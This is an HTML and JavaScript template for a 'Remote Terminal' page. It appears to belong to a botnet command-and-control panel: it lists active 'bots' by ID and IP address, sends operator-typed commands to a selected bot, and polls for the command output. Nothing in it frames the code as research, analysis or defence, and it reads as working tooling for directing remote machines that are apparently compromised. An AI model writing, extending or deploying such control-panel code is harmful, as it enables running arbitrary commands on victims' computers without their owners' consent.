{% extends "base.html" %}
{% block title %}Terminal{% endblock %}
{% block content %}
<div class="page-title">Remote Terminal</div>
<div style="margin-bottom:20px;">
    <label style="display:block; font-size:13px; color:#8b949e; margin-bottom:4px;">Target Node</label>
    <select id="botSelect" style="max-width:300px;">
        <option value="">-- Select --</option>
    </select>
</div>
<div class="card" style="background:#0d1117; padding:20px; min-height:300px;">
    <div id="termOutput" style="color:#c9d1d9; font-family:'Courier New',monospace; font-size:14px; white-space:pre-wrap; word-break:break-all; min-height:200px;">> Select a node and type a command...</div>
    <div style="display:flex; gap:10px; margin-top:15px;">
        <input type="text" id="cmdInput" placeholder="Enter command..." style="flex:1;">
        <button class="btn btn-info" onclick="sendCommand()">Run</button>
    </div>
</div>
<script>
    let selectedBot = null;
    async function loadBots() {
        try {
            const r = await fetch('/api/active_bots');
            const bots = await r.json();
            const sel = document.getElementById('botSelect');
            sel.innerHTML = '<option value="">-- Select --</option>' + bots.map(b => `<option value="${b.id}">${b.id} (${b.ip})</option>`).join('');
        } catch(e) {}
    }
    document.getElementById('botSelect').addEventListener('change', function() {
        selectedBot = this.value;
        document.getElementById('termOutput').innerText = `> Connected to node ${selectedBot || 'none'}`;
    });
    async function sendCommand() {
        const cmd = document.getElementById('cmdInput').value.trim();
        if (!cmd || !selectedBot) { alert('Select a node and enter a command.'); return; }
        const out = document.getElementById('termOutput');
        out.innerText += `\n${selectedBot}> ${cmd}`;
        try {
            const r = await fetch('/api/send_command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id: selectedBot, cmd })
            });
            if (!r.ok) { out.innerText += '\n[ERROR] Failed.'; return; }
            let attempts = 0;
            const interval = setInterval(async () => {
                attempts++;
                try {
                    const res = await fetch(`/api/get_result?id=${selectedBot}`);
                    if (res.ok) {
                        const data = await res.json();
                        if (data.output) {
                            out.innerText += `\n${data.output}`;
                            clearInterval(interval);
                            out.scrollTop = out.scrollHeight;
                        }
                    }
                } catch(e) {}
                if (attempts >= 15) { out.innerText += '\n[TIMEOUT]'; clearInterval(interval); }
            }, 1000);
        } catch(e) { out.innerText += '\n[ERROR] Network.'; }
        document.getElementById('cmdInput').value = '';
        out.scrollTop = out.scrollHeight;
    }
    document.getElementById('cmdInput').addEventListener('keypress', function(e) { if (e.key === 'Enter') sendCommand(); });
    loadBots();
    setInterval(loadBots, 5000);
</script>
{% endblock %}
